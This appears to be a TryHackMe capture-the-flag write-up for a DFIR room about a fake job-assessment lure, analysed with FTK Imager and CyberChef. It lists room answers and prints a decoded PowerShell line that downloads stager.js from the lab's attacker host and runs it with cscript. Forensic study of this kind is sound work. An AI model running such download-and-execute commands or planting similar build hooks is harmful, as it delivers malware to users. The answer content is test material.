<h1 align="left">The Interview</h1>

<p align="left">
  <img src="https://img.shields.io/static/v1?label=Category&message=DFIR&color=24292e&style=flat-square&v=1" /> &nbsp;
  <img src="https://img.shields.io/badge/Platform-TryHackMe-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Level-Hard-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Completed-2026, Nov 25%20-darkgreen?style=flat-square" /> &nbsp;
  <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white"  alt="LinkedIn"/></a> &nbsp;
  <a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/badge/GitHub-100000?style=flat-square&logo=github&logoColor=white" height="30" alt="GitHub"/></a> &nbsp;
</p> 

<h3>Scenario</h3>
<p>Randall Pike, a security researcher at Unbaitable Training Co., was exploring a new career opportunity when his week took an unexpected turn. What began as a promising conversation with a recruiter ended with a security alert on his machine. Randall took action, but he could not shake the feeling that he had caught it too late.<br>

A disk image of his Windows machine has been preserved for investigation. Your task is to piece together the events leading up to the alert, establish what happened afterwards, and determine what Randall may have overlooked.</p>

<p><em>Answer the questions below</em></p>

<p>What email address sent the technical assessment?<br>
<code>ecarter@brightlinesec-careers.thm</code></p>

<p>

- tools > Exterro FTK Imager<br>
- Partition 1 > root > Users > rpike > Desktop > Assessment_Invite.eml<br>
- Content -Disposition: attachment; filename="CandidateAssessment.zip"</p>

<img width="1215" height="672" alt="image" src="https://github.com/user-attachments/assets/4babfeb6-5cc8-41a2-a57a-81a675b2c4aa" />

<br>
<br>
<p>Which file contains the command responsible for initiating the compromise?<br>
<code>TechnicalAssessment.csproj</code></p>
<p>

- Exterro FTK Imager<br>
- Partition 1 > root > Users > rpike > Desktop > TechnicalAssessment > TechnicalAssessment.csproj</p>

<img width="743" height="415" alt="image" src="https://github.com/user-attachments/assets/d131a2bd-9241-4d87-bf6e-6e36271c85ea" />

<br>
<br>

<img width="1220" height="678" alt="image" src="https://github.com/user-attachments/assets/2059590d-9ad6-40dd-9d61-af18add96337" />

<br>
<br>
<p>

- CyberChef -> http://brightlinesec-careers.thm/stager.j</p>

```cyberchef
$dir = $env:TEMP; $file = Join-Path $dir "stager.js"; Invoke-WebRequest -Uri "http://brightlinesec-careers.thm/stager.js" -OutFile $file; cscript //nologo $file
```

<img width="1352" height="144" alt="image" src="https://github.com/user-attachments/assets/cfaede6e-adfe-4703-9c8b-3e13411d5f40" />

<br>
<br>
<p>http://brightlinesec-careers.thm/stager.j<br>
<code>http://brightlinesec-careers.thm/Ms1.exe</code></p>

<p>
  
- PowerShell -> D:\Users\rspike\AppData\Local\Temp\stager.js</p>

<img width="1139" height="283" alt="image" src="https://github.com/user-attachments/assets/90624f7d-a447-4436-b8ae-088f2336cea6" />

<br>
<br>
<p>What is the SHA-256 hash of the executable payload?<br>
<code>----------------------------------------------------------------</code></p>

<img width="1255" height="142" alt="image" src="https://github.com/user-attachments/assets/7363856c-c737-44c5-bdad-b7b9cd5c7eef" />

<br>
<br>

<img width="1123" height="78" alt="image" src="https://github.com/user-attachments/assets/8bb734b6-8357-4a00-ab2f-4c774f417a06" />

<br>
<br>

<img width="1143" height="145" alt="image" src="https://github.com/user-attachments/assets/e9d592a0-8a6b-4879-b39c-859f873ee891" />

<br>
<br>
<p>Which local account does the payload attempt to add to the Administrators group?<br>
<code>support_tech</code></p>

<img width="1231" height="243" alt="image" src="https://github.com/user-attachments/assets/2cae5f2a-dafd-4e98-a7ec-0cdeaaebd9ab" />


<br>
<br>
<p>What encryption key was used to protect the report?<br>
<code>--------------------------------</code></p>

<img width="1206" height="500" alt="image" src="https://github.com/user-attachments/assets/7dfce777-af1e-4af6-a160-b7d69aeca1c2" />


<br>
<br>

<img width="1147" height="183" alt="image" src="https://github.com/user-attachments/assets/af38eef1-e48b-48d3-b678-1f749649fb4d" />

<br>
<br>


<img width="1148" height="224" alt="image" src="https://github.com/user-attachments/assets/0ae17609-7dfd-4840-9310-0aa9cc1b5862" />

<br>
<br>

<img width="1144" height="153" alt="image" src="https://github.com/user-attachments/assets/78369b81-6f14-48c2-b042-da5d363187ff" />

<br>
<br>


<img width="1354" height="183" alt="image" src="https://github.com/user-attachments/assets/eb7a391b-0395-43ff-8dec-6b816f75acac" />


<br>
<br>

<img width="873" height="172" alt="image" src="https://github.com/user-attachments/assets/f6a937d2-7d3e-4f23-bc7a-cbd8b3eee75d" />

<br>
<br>
<br>


<p align="center"><img width="900px" src="https://github.com/user-attachments/assets/b6e3c627-8b8e-4d92-b910-6a886926cb32"><br>
                  <img width="300px" src="https://github.com/user-attachments/assets/777af009-a948-418d-9b67-bc07003d90c5"></p>


